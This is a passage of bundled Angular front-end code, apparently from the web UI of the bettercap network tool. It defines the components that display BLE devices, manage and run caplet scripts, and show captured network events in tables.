        if ($('.menu-dropdown').is(':visible'))
            return;
        var devices = session.ble['devices'];
        if (devices.length == 0)
            this.currDev = null;
        this.sortService.sort(devices, this.sort);
        this.devices = devices;
        if (this.currDev != null) {
            for (var i = 0; i < this.devices.length; i++) {
                var dev = this.devices[i];
                if (dev.mac == this.currDev.mac) {
                    this.currDev = dev;
                    break;
                }
            }
        }
    };
    BleTableComponent = tslib__WEBPACK_IMPORTED_MODULE_0__["__decorate"]([
        Object(_angular_core__WEBPACK_IMPORTED_MODULE_1__["Component"])({
            selector: 'ui-ble-table',
            template: __webpack_require__(/*! ./ble-table.component.html */ "./src/app/components/ble-table/ble-table.component.html"),
            styles: [__webpack_require__(/*! ./ble-table.component.scss */ "./src/app/components/ble-table/ble-table.component.scss")]
        }),
        tslib__WEBPACK_IMPORTED_MODULE_0__["__metadata"]("design:paramtypes", [_services_api_service__WEBPACK_IMPORTED_MODULE_3__["ApiService"], _services_sort_service__WEBPACK_IMPORTED_MODULE_2__["SortService"], _services_omnibar_service__WEBPACK_IMPORTED_MODULE_4__["OmniBarService"], _services_clipboard_service__WEBPACK_IMPORTED_MODULE_5__["ClipboardService"]])
    ], BleTableComponent);
    return BleTableComponent;
}());



/***/ }),

/***/ "./src/app/components/caplets/caplets.component.html":
/*!***********************************************************!*\
  !*** ./src/app/components/caplets/caplets.component.html ***!
  \***********************************************************/
/*! no static exports found */
/***/ (function(module, exports) {

module.exports = "<div class=\"row\">\n  <div class=\"col-2 mod-nav\">\n    <div class=\"nav flex-column nav-pills\" id=\"v-pills-tab\" role=\"tablist\" aria-orientation=\"vertical\">\n\n      <a *ngIf=\"caplets.length == 0\" class=\"nav-link\">\n        Install \n      </a>\n\n      <a *ngIf=\"caplets.length > 0\" (click)=\"onUpdateAll()\" class=\"nav-link\" class=\"btn btn-sm btn-secondary\" style=\"margin:10px\">\n        <i class=\"fas fa-download\"></i>\n        Update All\n      </a>\n\n      <a \n         *ngFor=\"let cap of caplets | search: omnibar.query\" \n         (click)=\"curCap = cap; successMessage = ''; errorMessage = '';\"\n         class=\"nav-link\" [class.active]=\"curCap && curCap.name == cap.name\">\n        {{ cap.name.split('/').pop() }} <small class=\"text-muted\">{{ cap.size | size:0 }}</small>\n\n        <div *ngIf=\"curCap && curCap.name == cap.name && cap.scripts.length> 0\" style=\"padding-left:15px\">\n          <small *ngFor=\"let script of cap.scripts\" class=\"text-muted\">\n            {{ script.path.split('/').pop() }} {{ script.size | size:0 }}\n            <br/>\n          </small>\n        </div>\n      </a>\n      \n    </div>\n  </div>\n\n  <div class=\"col-10 mod-content\">\n    \n    <div *ngIf=\"caplets.length == 0\" class=\"container-fluid shadow-sm\">\n      <div class=\"row\">\n        <div class=\"col-12\">\n          <p class=\"mod-description\">\n            No caplets installed so far.\n          </p>\n        </div>\n      </div>\n      <div class=\"row\">\n        <div class=\"col-12\">\n          <button type=\"button\" class=\"btn btn-warning\" (click)=\"api.cmd('caplets.update')\">\n            <i class=\"fas fa-download\"></i>\n            Install\n          </button>\n          <br/>\n          <br/>\n        </div>\n      </div>\n    </div>\n\n    <div *ngIf=\"successMessage\" class=\"alert alert-dismissable fade show alert-success\" role=\"alert\">\n      {{ successMessage }}\n      <button type=\"button\" class=\"close\" data-dismiss=\"alert\" aria-label=\"Close\">\n        <span aria-hidden=\"true\">&times;</span>\n      </button>\n    </div>\n\n    <div *ngIf=\"errorMessage\" class=\"alert alert-dismissable fade show alert-danger\" role=\"alert\">\n      {{ errorMessage }}\n      <button type=\"button\" class=\"close\" data-dismiss=\"alert\" aria-label=\"Close\">\n        <span aria-hidden=\"true\">&times;</span>\n      </button>\n    </div>\n\n    <div *ngFor=\"let item of curScripts()\" class=\"container-fluid shadow-sm\">\n      <div class=\"row\">\n        <div class=\"col-12\">\n\n          <div class=\"btn-group\" style=\"width:100%; margin-bottom:10px\" role=\"group\">\n            <button class=\"btn btn-sm btn-dark\" (click)=\"saveCaplet(item)\" ngbTooltip=\"Save caplet code.\">\n              <i class=\"fas fa-save\"></i>\n            </button>\n            <button *ngIf=\"item.path.indexOf('.cap') != -1\" class=\"btn btn-sm btn-dark\" (click)=\"runCaplet(item)\" ngbTooltip=\"Run this caplet.\">\n              <i class=\"fas fa-play\"></i>\n            </button>\n            <input \n                 type=\"text\" \n                 class=\"form-control form-control-sm param-input disabled\" \n                 style=\"width:100%\"\n                 value=\"{{ item.path }}\" disabled readonly/>\n          </div>\n\n          <textarea \n            rows=\"{{ item.code.length <= 30 ? item.code.length : 30 }}\" \n            id=\"capCode{{ item.index }}\"\n            name=\"capCode{{ item.index }}\"\n            class=\"form-control param-input caplet\" required>{{ item.code.join(\"\\n\") }}</textarea>\n\n          <br/>\n        </div>\n\n      </div>\n\n  </div>\n</div>\n"

/***/ }),

/***/ "./src/app/components/caplets/caplets.component.scss":
/*!***********************************************************!*\
  !*** ./src/app/components/caplets/caplets.component.scss ***!
  \***********************************************************/
/*! no static exports found */
/***/ (function(module, exports) {

module.exports = "*.nav-link {\n  cursor: pointer;\n}\n\n.nav-pills .nav-link {\n  border-radius: none;\n  border: none;\n  color: #fff;\n  font-size: 15px;\n  background-color: #32383e;\n}\n\n.nav-pills .nav-link.active, .nav-pills .show > .nav-link {\n  border-radius: 0;\n  border: none;\n  color: #aaa;\n  background-color: #212529;\n}\n\n.mod-nav {\n  margin-right: 0;\n  padding-right: 0;\n}\n\np.mod-description {\n  font-size: 1rem;\n}\n\ndiv.mod-content {\n  padding-top: 12px;\n  background-color: #212529;\n  color: #fff;\n}\n\ninput.param-input {\n  background-color: #333;\n  border: 1px solid #353535;\n  color: #aaa;\n}\n\ntextarea.caplet {\n  font-family: \"Roboto Mono\", monospace;\n  font-weight: 100;\n  font-size: 0.8rem;\n}\n/*# sourceMappingURL=data:application/json;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbIi9Vc2Vycy9ldmlsc29ja2V0L0JhaGFtdXQvTGFiL2JldHRlcmNhcC91aS9zcmMvYXBwL2NvbXBvbmVudHMvY2FwbGV0cy9jYXBsZXRzLmNvbXBvbmVudC5zY3NzIiwic3JjL2FwcC9jb21wb25lbnRzL2NhcGxldHMvY2FwbGV0cy5jb21wb25lbnQuc2NzcyJdLCJuYW1lcyI6W10sIm1hcHBpbmdzIjoiQUFBQTtFQUNJLGVBQUE7QUNDSjs7QURFQTtFQUNJLG1CQUFBO0VBQ0EsWUFBQTtFQUNBLFdBQUE7RUFDQSxlQUFBO0VBQ0EseUJBQUE7QUNDSjs7QURFQTtFQUNJLGdCQUFBO0VBQ0EsWUFBQTtFQUNBLFdBQUE7RUFDQSx5QkFBQTtBQ0NKOztBREdBO0VBQ0ksZUFBQTtFQUNBLGdCQUFBO0FDQUo7O0FER0E7RUFDSSxlQUFBO0FDQUo7O0FER0E7RUFDSSxpQkFBQTtFQUNBLHlCQUFBO0VBQ0EsV0FBQTtBQ0FKOztBREdBO0VBQ0ksc0JBQUE7RUFDQSx5QkFBQTtFQUNBLFdBQUE7QUNBSjs7QURHQTtFQUNJLHFDQUFBO0VBQ0EsZ0JBQUE7RUFDQSxpQkFBQTtBQ0FKIiwiZmlsZSI6InNyYy9hcHAvY29tcG9uZW50cy9jYXBsZXRzL2NhcGxldHMuY29tcG9uZW50LnNjc3MiLCJzb3VyY2VzQ29udGVudCI6WyIqLm5hdi1saW5rIHtcbiAgICBjdXJzb3I6IHBvaW50ZXI7XG59XG5cbi5uYXYtcGlsbHMgLm5hdi1saW5rIHtcbiAgICBib3JkZXItcmFkaXVzOiBub25lO1xuICAgIGJvcmRlcjogbm9uZTtcbiAgICBjb2xvcjogI2ZmZjtcbiAgICBmb250LXNpemU6IDE1cHg7XG4gICAgYmFja2dyb3VuZC1jb2xvcjogIzMyMzgzZTtcbn1cblxuLm5hdi1waWxscyAubmF2LWxpbmsuYWN0aXZlLCAubmF2LXBpbGxzIC5zaG93Pi5uYXYtbGluayB7XG4gICAgYm9yZGVyLXJhZGl1czogMDtcbiAgICBib3JkZXI6IG5vbmU7XG4gICAgY29sb3I6ICNhYWE7XG4gICAgYmFja2dyb3VuZC1jb2xvcjogIzIxMjUyOTtcbn1cblxuXG4ubW9kLW5hdiB7XG4gICAgbWFyZ2luLXJpZ2h0OiAwO1xuICAgIHBhZGRpbmctcmlnaHQ6IDA7XG59XG5cbnAubW9kLWRlc2NyaXB0aW9uIHtcbiAgICBmb250LXNpemU6IDFyZW07XG59XG5cbmRpdi5tb2QtY29udGVudCB7XG4gICAgcGFkZGluZy10b3A6IDEycHg7XG4gICAgYmFja2dyb3VuZC1jb2xvcjogIzIxMjUyOTtcbiAgICBjb2xvcjogI2ZmZjtcbn1cblxuaW5wdXQucGFyYW0taW5wdXQge1xuICAgIGJhY2tncm91bmQtY29sb3I6IzMzMzsgXG4gICAgYm9yZGVyOiAxcHggc29saWQgIzM1MzUzNTsgXG4gICAgY29sb3I6ICNhYWE7XG59XG5cbnRleHRhcmVhLmNhcGxldCB7XG4gICAgZm9udC1mYW1pbHk6ICdSb2JvdG8gTW9ubycsIG1vbm9zcGFjZTtcbiAgICBmb250LXdlaWdodDogMTAwO1xuICAgIGZvbnQtc2l6ZTogLjhyZW07XG59XG4iLCIqLm5hdi1saW5rIHtcbiAgY3Vyc29yOiBwb2ludGVyO1xufVxuXG4ubmF2LXBpbGxzIC5uYXYtbGluayB7XG4gIGJvcmRlci1yYWRpdXM6IG5vbmU7XG4gIGJvcmRlcjogbm9uZTtcbiAgY29sb3I6ICNmZmY7XG4gIGZvbnQtc2l6ZTogMTVweDtcbiAgYmFja2dyb3VuZC1jb2xvcjogIzMyMzgzZTtcbn1cblxuLm5hdi1waWxscyAubmF2LWxpbmsuYWN0aXZlLCAubmF2LXBpbGxzIC5zaG93ID4gLm5hdi1saW5rIHtcbiAgYm9yZGVyLXJhZGl1czogMDtcbiAgYm9yZGVyOiBub25lO1xuICBjb2xvcjogI2FhYTtcbiAgYmFja2dyb3VuZC1jb2xvcjogIzIxMjUyOTtcbn1cblxuLm1vZC1uYXYge1xuICBtYXJnaW4tcmlnaHQ6IDA7XG4gIHBhZGRpbmctcmlnaHQ6IDA7XG59XG5cbnAubW9kLWRlc2NyaXB0aW9uIHtcbiAgZm9udC1zaXplOiAxcmVtO1xufVxuXG5kaXYubW9kLWNvbnRlbnQge1xuICBwYWRkaW5nLXRvcDogMTJweDtcbiAgYmFja2dyb3VuZC1jb2xvcjogIzIxMjUyOTtcbiAgY29sb3I6ICNmZmY7XG59XG5cbmlucHV0LnBhcmFtLWlucHV0IHtcbiAgYmFja2dyb3VuZC1jb2xvcjogIzMzMztcbiAgYm9yZGVyOiAxcHggc29saWQgIzM1MzUzNTtcbiAgY29sb3I6ICNhYWE7XG59XG5cbnRleHRhcmVhLmNhcGxldCB7XG4gIGZvbnQtZmFtaWx5OiBcIlJvYm90byBNb25vXCIsIG1vbm9zcGFjZTtcbiAgZm9udC13ZWlnaHQ6IDEwMDtcbiAgZm9udC1zaXplOiAwLjhyZW07XG59Il19 */"

/***/ }),

/***/ "./src/app/components/caplets/caplets.component.ts":
/*!*********************************************************!*\
  !*** ./src/app/components/caplets/caplets.component.ts ***!
  \*********************************************************/
/*! exports provided: CapletsComponent */
/***/ (function(module, __webpack_exports__, __webpack_require__) {

"use strict";
__webpack_require__.r(__webpack_exports__);
/* harmony export (binding) */ __webpack_require__.d(__webpack_exports__, "CapletsComponent", function() { return CapletsComponent; });
/* harmony import */ var tslib__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(/*! tslib */ "./node_modules/tslib/tslib.es6.js");
/* harmony import */ var _angular_core__WEBPACK_IMPORTED_MODULE_1__ = __webpack_require__(/*! @angular/core */ "./node_modules/@angular/core/fesm5/core.js");
/* harmony import */ var _services_api_service__WEBPACK_IMPORTED_MODULE_2__ = __webpack_require__(/*! ../../services/api.service */ "./src/app/services/api.service.ts");
/* harmony import */ var _services_sort_service__WEBPACK_IMPORTED_MODULE_3__ = __webpack_require__(/*! ../../services/sort.service */ "./src/app/services/sort.service.ts");
/* harmony import */ var _services_omnibar_service__WEBPACK_IMPORTED_MODULE_4__ = __webpack_require__(/*! ../../services/omnibar.service */ "./src/app/services/omnibar.service.ts");





var CapletsComponent = /** @class */ (function () {
    function CapletsComponent(api, sortService, omnibar) {
        this.api = api;
        this.sortService = sortService;
        this.omnibar = omnibar;
        this.caplets = [];
        this.successMessage = '';
        this.errorMessage = '';
        this.curTab = 0;
        this.curCap = null;
        this.update(this.api.session);
    }
    CapletsComponent.prototype.ngOnInit = function () {
        var _this = this;
        this.api.onNewData.subscribe(function (session) {
            _this.update(session);
        });
    };
    CapletsComponent.prototype.ngOnDestroy = function () {
    };
    CapletsComponent.prototype.onUpdateAll = function () {
        if (confirm("This will download the new caplets from github and overwrite the previously installed ones, continue?")) {
            this.api.cmd('caplets.update');
        }
    };
    CapletsComponent.prototype.runCaplet = function (cap) {
        var _this = this;
        this.api.cmd("include " + cap.path, true).subscribe(function (val) {
            _this.successMessage = cap.path + ' executed.';
        }, function (error) {
            _this.errorMessage = error.error;
        }, function () { });
    };
    CapletsComponent.prototype.saveCaplet = function (cap) {
        var _this = this;
        var code = $('#capCode' + cap.index).val();
        this.api.writeFile(cap.path, code).subscribe(function (val) {
            _this.successMessage = cap.path + ' saved.';
        }, function (error) {
            _this.errorMessage = error.error;
        }, function () { });
    };
    CapletsComponent.prototype.curScripts = function () {
        if (!this.curCap)
            return [];
        this.curCap.index = 0;
        var files = [this.curCap];
        for (var i = 0; i < this.curCap.scripts.length; i++) {
            var script = this.curCap.scripts[i];
            script.index = i + 1;
            files.push(script);
        }
        return files;
    };
    CapletsComponent.prototype.capletNeedsUpdate = function (newCaplet, existingCaplet) {
        if (!existingCaplet)
            return true;
        if (newCaplet.size != existingCaplet.size)
            return true;
        if (newCaplet.code.length != existingCaplet.code.length)
            return true;
        for (var i = 0; i < newCaplet.code.length; i++) {
            if (newCaplet.code[i] !== existingCaplet.code[i])
                return true;
        }
        return false;
    };
    CapletsComponent.prototype.update = function (session) {
        for (var i = 0; i < session.caplets.length; i++) {
            var cap = session.caplets[i];
            if (!this.curCap || this.curCap.name == cap.name) {
                if (this.capletNeedsUpdate(cap, this.curCap))
                    this.curCap = cap;
                break;
            }
        }
        this.sortService.sort(session.caplets, {
            field: 'name',
            direction: 'desc',
            type: ''
        });
        this.session = session;
        this.caplets = session.caplets;
    };
    CapletsComponent = tslib__WEBPACK_IMPORTED_MODULE_0__["__decorate"]([
        Object(_angular_core__WEBPACK_IMPORTED_MODULE_1__["Component"])({
            selector: 'ui-caplets',
            template: __webpack_require__(/*! ./caplets.component.html */ "./src/app/components/caplets/caplets.component.html"),
            styles: [__webpack_require__(/*! ./caplets.component.scss */ "./src/app/components/caplets/caplets.component.scss")]
        }),
        tslib__WEBPACK_IMPORTED_MODULE_0__["__metadata"]("design:paramtypes", [_services_api_service__WEBPACK_IMPORTED_MODULE_2__["ApiService"], _services_sort_service__WEBPACK_IMPORTED_MODULE_3__["SortService"], _services_omnibar_service__WEBPACK_IMPORTED_MODULE_4__["OmniBarService"]])
    ], CapletsComponent);
    return CapletsComponent;
}());



/***/ }),

/***/ "./src/app/components/event/event.component.html":
/*!*******************************************************!*\
  !*** ./src/app/components/event/event.component.html ***!
  \*******************************************************/
/*! no static exports found */
/***/ (function(module, exports) {

module.exports = "<span [ngSwitch]=\"true\" class=\"event-data\">\n  <span *ngSwitchCase=\"event.tag == 'endpoint.new'\">\n    Detected <strong>{{ data.ipv4 }}</strong> \n    <span *ngIf=\"data.alias\" class=\"badge badge-pill badge-secondary\" style=\"margin-left: 5px\">{{ data.alias }}</span>\n    {{ data.mac | uppercase }} \n    <span *ngIf=\"data.vendor\" class=\"badge badge-pill badge-dark\">{{ data.vendor }}</span>\n  </span>\n  <span *ngSwitchCase=\"event.tag == 'endpoint.lost'\">\n    Lost <strong>{{ data.ipv4 }}</strong> {{ data.mac | uppercase }} \n    <span *ngIf=\"data.vendor\" class=\"badge badge-pill badge-dark\">{{ data.vendor }}</span>\n  </span>\n\n  <span *ngSwitchCase=\"event.tag == 'wifi.client.probe'\">\n    Station <strong>{{ data.mac | uppercase }}</strong> \n    <span *ngIf=\"data.vendor\" class=\"badge badge-pill badge-dark\">{{ data.vendor }}</span> \n    <span *ngIf=\"data.alias\" class=\"badge badge-pill badge-secondary\">{{ data.alias }}</span>\n    is probing for <strong>{{ data.essid }}</strong>\n  </span>\n  <span *ngSwitchCase=\"event.tag == 'wifi.client.handshake'\">\n    Captured handshake for station <strong>{{ data.station }}</strong> \n    connecting to AP <strong>{{ data.ap }}</strong>\n  </span>\n  <span *ngSwitchCase=\"event.tag == 'wifi.client.new'\">\n    Detected client \n    <strong>{{ data.Client.mac | uppercase }}</strong>\n    <span *ngIf=\"data.vendor\" class=\"badge badge-pill badge-dark\">{{ data.Client.vendor }}</span> \n    <span *ngIf=\"data.Client.alias\" class=\"badge badge-pill badge-secondary\">{{ data.Client.alias }}</span>\n    for AP <strong>{{ data.AP.mac | uppercase }}</strong>\n  </span>\n  <span *ngSwitchCase=\"event.tag == 'wifi.client.lost'\">\n    Lost client \n    <strong>{{ data.Client.mac | uppercase }}</strong>\n    <span *ngIf=\"data.vendor\" class=\"badge badge-pill badge-dark\">{{ data.Client.vendor }}</span> \n    <span *ngIf=\"data.Client.alias\" class=\"badge badge-pill badge-secondary\">{{ data.Client.alias }}</span>\n    for AP <strong>{{ data.AP.mac | uppercase }}</strong>\n  </span>\n  <span *ngSwitchCase=\"event.tag == 'wifi.ap.new'\">\n    Detected <strong>{{ data.hostname }}</strong> \n    {{ data.mac | uppercase }}\n    <span *ngIf=\"data.vendor\" class=\"badge badge-pill badge-dark\">{{ data.vendor }}</span> \n    with <strong>{{ data.encryption }}</strong> encryption and {{ data.clients.length }} clients\n  </span>\n  <span *ngSwitchCase=\"event.tag == 'wifi.ap.lost'\">\n    Lost <strong>{{ data.hostname }}</strong> \n    {{ data.mac | uppercase }}\n    <span *ngIf=\"data.vendor\" class=\"badge badge-pill badge-dark\">{{ data.vendor }}</span>\n  </span>\n\n  <span *ngSwitchCase=\"event.tag == 'ble.device.new'\">\n    Detected <strong>{{ data.mac | uppercase }}</strong> \n    <span *ngIf=\"data.vendor\" class=\"badge badge-pill badge-dark\">{{ data.vendor }}</span>: \n    <strong>flags</strong>: {{data.flags}},\n    <strong>connectable</strong>: {{data.connectable}}\n  </span>\n  <span *ngSwitchCase=\"event.tag == 'ble.device.lost'\">\n    Lost <strong>{{ data.mac | uppercase }}</strong> \n    <span *ngIf=\"data.vendor\" class=\"badge badge-pill badge-dark\">{{ data.vendor }}</span>: \n    <strong>flags</strong>: {{data.flags}},\n    <strong>connectable</strong>: {{data.connectable}}\n  </span>\n  <span *ngSwitchCase=\"event.tag == 'ble.device.disconnected'\">\n  </span>\n  <span *ngSwitchCase=\"event.tag == 'ble.connection.timeout'\">\n    Timeout while connecting to <strong>{{ data.mac | uppercase }}</strong> \n    <span *ngIf=\"data.vendor\" class=\"badge badge-pill badge-dark\">{{ data.vendor }}</span>: \n    <strong>flags</strong>: {{data.flags}},\n    <strong>connectable</strong>: {{data.connectable}}\n  </span>\n\n  <span *ngSwitchCase=\"event.tag == 'hid.device.new'\">\n    Detected {{data.type}} HID device <strong>{{ data.address | uppercase }}</strong>\n  </span>\n  <span *ngSwitchCase=\"event.tag == 'hid.device.lost'\">\n    Lost {{data.type}} HID device <strong>{{ data.address | uppercase }}</strong>\n  </span>\n\n  <span *ngSwitchCase=\"event.tag == 'sys.log'\">\n    <strong>{{ logLevel(data.Level) }}</strong>: {{ data.Message | unbash }}\n  </span>\n\n  <span *ngSwitchCase=\"event.tag.indexOf('mod.') == 0\">\n    {{ data }}\n  </span>\n\n  <span *ngSwitchCase=\"event.tag.indexOf('net.sniff.') == 0\">\n    {{ data.message | unbash }}\n  </span>\n\n  <span *ngSwitchDefault>\n    <span *ngFor=\"let item of data | keyvalue\" style=\"margin-left:2px\">\n      <span *ngIf=\"(item.value | json) != '{}'\">\n        <strong>{{ item.key }}</strong>: {{ item.value }}\n      </span>\n    </span>\n  </span>\n\n</span>\n"

/***/ }),

/***/ "./src/app/components/event/event.component.scss":
/*!*******************************************************!*\
  !*** ./src/app/components/event/event.component.scss ***!
  \*******************************************************/
/*! no static exports found */
/***/ (function(module, exports) {

module.exports = "\n/*# sourceMappingURL=data:application/json;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbXSwibmFtZXMiOltdLCJtYXBwaW5ncyI6IiIsImZpbGUiOiJzcmMvYXBwL2NvbXBvbmVudHMvZXZlbnQvZXZlbnQuY29tcG9uZW50LnNjc3MifQ== */"

/***/ }),

/***/ "./src/app/components/event/event.component.ts":
/*!*****************************************************!*\
  !*** ./src/app/components/event/event.component.ts ***!
  \*****************************************************/
/*! exports provided: EventComponent */
/***/ (function(module, __webpack_exports__, __webpack_require__) {

"use strict";
__webpack_require__.r(__webpack_exports__);
/* harmony export (binding) */ __webpack_require__.d(__webpack_exports__, "EventComponent", function() { return EventComponent; });
/* harmony import */ var tslib__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(/*! tslib */ "./node_modules/tslib/tslib.es6.js");
/* harmony import */ var _angular_core__WEBPACK_IMPORTED_MODULE_1__ = __webpack_require__(/*! @angular/core */ "./node_modules/@angular/core/fesm5/core.js");


var EventComponent = /** @class */ (function () {
    function EventComponent() {
        this.logLevels = [
            "DEBUG",
            "INFO",
            "IMPORTANT",
            "WARNING",
            "ERROR",
            "FATAL"
        ];
    }
    Object.defineProperty(EventComponent.prototype, "data", {
        get: function () {
            return this.event.data;
        },
        enumerable: true,
        configurable: true
    });
    EventComponent.prototype.logLevel = function (level) {
        return this.logLevels[level];
    };
    tslib__WEBPACK_IMPORTED_MODULE_0__["__decorate"]([
        Object(_angular_core__WEBPACK_IMPORTED_MODULE_1__["Input"])(),
        tslib__WEBPACK_IMPORTED_MODULE_0__["__metadata"]("design:type", Object)
    ], EventComponent.prototype, "event", void 0);
    EventComponent = tslib__WEBPACK_IMPORTED_MODULE_0__["__decorate"]([
        Object(_angular_core__WEBPACK_IMPORTED_MODULE_1__["Component"])({
            selector: 'event-data',
            template: __webpack_require__(/*! ./event.component.html */ "./src/app/components/event/event.component.html"),
            styles: [__webpack_require__(/*! ./event.component.scss */ "./src/app/components/event/event.component.scss")]
        }),
        tslib__WEBPACK_IMPORTED_MODULE_0__["__metadata"]("design:paramtypes", [])
    ], EventComponent);
    return EventComponent;
}());



/***/ }),

/***/ "./src/app/components/events-table/events-table.component.html":
/*!*********************************************************************!*\
  !*** ./src/app/components/events-table/events-table.component.html ***!
  \*********************************************************************/
/*! no static exports found */
/***/ (function(module, exports) {

module.exports = "<div *ngIf=\"ignored.length > 0\">\n  <table class=\"table table-sm table-dark\" style=\"margin-bottom: 5px\">\n    <tbody>\n      <tr>\n        <td width=\"1%\" class=\"nowrap\">\n          Muted\n        </td>\n        <td>\n          <button \n           *ngFor=\"let name of ignored\"\n           class=\"btn btn-sm btn-event btn-{{ btnFor(name) }}\"\n           style=\"margin-left: 5px\"\n           (click)=\"api.cmd('events.include ' + name)\"\n           ngbTooltip=\"Click to unmute this type of events.\"\n           >\n         {{ name }}\n          </button>\n\n          <button \n            *ngIf=\"ignored.length > 1\"\n            class=\"btn btn-sm btn-danger btn-action btn-event\"\n           style=\"margin-left: 10px\"\n            ngbTooltip=\"Clear the muted events list.\"\n            placement=\"right\"\n            (click)=\"api.cmd('events.filters.clear')\"\n            >\n            clear\n          </button>\n        </td>\n      </tr>\n    </tbody>\n  </table>\n</div>\n\n<div class=\"table-responsive\">\n  <table class=\"table table-sm table-dark\">\n    <thead>\n      <tr>\n        <th width=\"1%\" sortable-column=\"time\" sort-type=\"time\" sort-direction=\"desc\">Time</th>\n        <th width=\"1%\" sortable-column=\"tag\">Type</th>\n        <th></th>\n      </tr>\n    </thead>\n    <tbody>\n\n      <tr *ngIf=\"events.length == 0\">\n        <td colspan=\"3\" align=\"center\">\n          <i>empty</i>\n        </td>\n      </tr>\n\n      <tr *ngFor=\"let event of events | search: omnibar.query\">\n        <td class=\"nowrap\">{{ event.time | date: 'short' }}</td>\n        <td>\n          <button \n            class=\"btn btn-sm btn-event btn-{{ btnFor(event.tag) }}\"\n            (click)=\"api.cmd('events.ignore ' + event.tag)\"\n            ngbTooltip=\"Click to mute this type of events.\"\n            placement=\"right\"\n          >\n            {{ event.tag }}\n          </button>\n        </td>\n        <td (click)=\"showEvent(event)\" style=\"cursor: pointer\">\n          <event-data [event]=\"event\"></event-data>\n        </td>\n      </tr>\n    </tbody>\n  </table>\n</div>\n\n<div id=\"eventModal\" class=\"modal fade\" tabindex=\"-1\" role=\"dialog\" aria-labelledby=\"eventModalTitle\" [ngModel]=\"curEvent\" name=\"fieldName\" ngDefaultControl>\n  <div class=\"modal-dialog modal-lg\" role=\"document\">\n    <div class=\"modal-content\">\n\n      <div class=\"modal-body\" style=\"padding:0\">\n        &nbsp;\n        <span class=\"badge badge-{{ btnFor(curEvent.tag) }}\">{{ curEvent.tag }}</span>\n        &nbsp;\n        <small>{{ curEvent.time | date: 'long' }}</small>\n  \n        <button type=\"button\" class=\"close\" data-dismiss=\"modal\" aria-label=\"Close\" style=\"margin-right:5px\">\n          <span aria-hidden=\"true\">&times;</span>\n        </button>\n\n\n        <pre><code [highlight]=\"curEventData()\" class=\"json\"></code></pre>\n      </div>\n    </div>\n  </div>\n</div>\n"

/***/ }),

/***/ "./src/app/components/events-table/events-table.component.scss":
/*!*********************************************************************!*\
  !*** ./src/app/components/events-table/events-table.component.scss ***!
  \*********************************************************************/
/*! no static exports found */
/***/ (function(module, exports) {

module.exports = "button.btn-event {\n  font-size: 0.8rem;\n  padding: 0.05rem 0.3rem;\n  line-height: 1;\n  border-radius: 0.1rem;\n}\n/*# sourceMappingURL=data:application/json;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbIi9Vc2Vycy9ldmlsc29ja2V0L0JhaGFtdXQvTGFiL2JldHRlcmNhcC91aS9zcmMvYXBwL2NvbXBvbmVudHMvZXZlbnRzLXRhYmxlL2V2ZW50cy10YWJsZS5jb21wb25lbnQuc2NzcyIsInNyYy9hcHAvY29tcG9uZW50cy9ldmVudHMtdGFibGUvZXZlbnRzLXRhYmxlLmNvbXBvbmVudC5zY3NzIl0sIm5hbWVzIjpbXSwibWFwcGluZ3MiOiJBQUFBO0VBQ0ksaUJBQUE7RUFDQSx1QkFBQTtFQUNBLGNBQUE7RUFDQSxxQkFBQTtBQ0NKIiwiZmlsZSI6InNyYy9hcHAvY29tcG9uZW50cy9ldmVudHMtdGFibGUvZXZlbnRzLXRhYmxlLmNvbXBvbmVudC5zY3NzIiwic291cmNlc0NvbnRlbnQiOlsiYnV0dG9uLmJ0bi1ldmVudCB7XG4gICAgZm9udC1zaXplOiAuOHJlbTtcbiAgICBwYWRkaW5nOiAuMDVyZW0gLjNyZW07XG4gICAgbGluZS1oZWlnaHQ6IDEuMDtcbiAgICBib3JkZXItcmFkaXVzOiAuMXJlbTtcbn1cbiIsImJ1dHRvbi5idG4tZXZlbnQge1xuICBmb250LXNpemU6IDAuOHJlbTtcbiAgcGFkZGluZzogMC4wNXJlbSAwLjNyZW07XG4gIGxpbmUtaGVpZ2h0OiAxO1xuICBib3JkZXItcmFkaXVzOiAwLjFyZW07XG59Il19 */"

/***/ }),

/***/ "./src/app/components/events-table/events-table.component.ts":
/*!*******************************************************************!*\
  !*** ./src/app/components/events-table/events-table.component.ts ***!
  \*******************************************************************/
/*! exports provided: EventsTableComponent */
/***/ (function(module, __webpack_exports__, __webpack_require__) {

"use strict";
__webpack_require__.r(__webpack_exports__);
/* harmony export (binding) */ __webpack_require__.d(__webpack_exports__, "EventsTableComponent", function() { return EventsTableComponent; });
/* harmony import */ var tslib__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(/*! tslib */ "./node_modules/tslib/tslib.es6.js");
/* harmony import */ var _angular_core__WEBPACK_IMPORTED_MODULE_1__ = __webpack_require__(/*! @angular/core */ "./node_modules/@angular/core/fesm5/core.js");
/* harmony import */ var _services_api_service__WEBPACK_IMPORTED_MODULE_2__ = __webpack_require__(/*! ../../services/api.service */ "./src/app/services/api.service.ts");
/* harmony import */ var _services_sort_service__WEBPACK_IMPORTED_MODULE_3__ = __webpack_require__(/*! ../../services/sort.service */ "./src/app/services/sort.service.ts");
/* harmony import */ var _services_omnibar_service__WEBPACK_IMPORTED_MODULE_4__ = __webpack_require__(/*! ../../services/omnibar.service */ "./src/app/services/omnibar.service.ts");





var EventsTableComponent = /** @class */ (function () {
    function EventsTableComponent(api, sortService, omnibar) {
        this.api = api;
        this.sortService = sortService;
        this.omnibar = omnibar;
        this.events = [];
        this.ignored = [];
        this.modEnabled = false;
        this.query = '';
        this.subscriptions = [];
        this.curEvent = null;
        this.sort = { field: 'time', direction: 'asc', type: '' };
        this.update(this.api.events);
    }
    EventsTableComponent.prototype.ngOnInit = function () {
        var _this = this;
        this.subscriptions = [
            this.api.onNewEvents.subscribe(function (events) {
                _this.update(events);
            }),
            this.sortService.onSort.subscribe(function (event) {
                _this.sort = event;
                _this.sortService.sort(_this.events, event);
            })
        ];
    };
    EventsTableComponent.prototype.ngOnDestroy = function () {
        for (var i = 0; i < this.subscriptions.length; i++) {
            this.subscriptions[i].unsubscribe();
        }
        this.subscriptions = [];
    };
    EventsTableComponent.prototype.update = function (events) {
        var mod = this.api.module('events.stream');
        this.modEnabled = mod.running;
        this.ignored = mod.state.ignoring.sort();
        this.events = events;
        this.sortService.sort(this.events, this.sort);
    };
    EventsTableComponent.prototype.btnFor = function (tag) {
